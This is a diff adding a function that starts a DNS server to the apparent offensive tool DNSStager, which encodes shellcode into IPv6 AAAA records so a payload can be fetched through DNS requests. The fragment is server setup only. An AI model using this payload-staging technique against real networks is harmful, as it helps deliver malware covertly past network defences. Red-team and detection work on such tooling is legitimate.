@@ -177,3 +177,17 @@ def generate_zone_ipv6(domain, shellcode, prefix):
         ZONES[domain_name] = [Record(AAAA, ipv6s[i])]
     #print(ZONES)
     return(ZONES)
+
+
+def start_dns_server(ZONES):
+    print_info("DNSStager will send %s DNS requests to get the full payload" % len(ZONES))
+    print_success("Starting DNS server .. ")
+    resolver = Resolver(ZONES)
+
+    try:
+        server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
+        print_success("Server started!")
+        server.start()
+    except Exception as e:
+        print_error("Can't start DNS server!")
+        print_error(e)
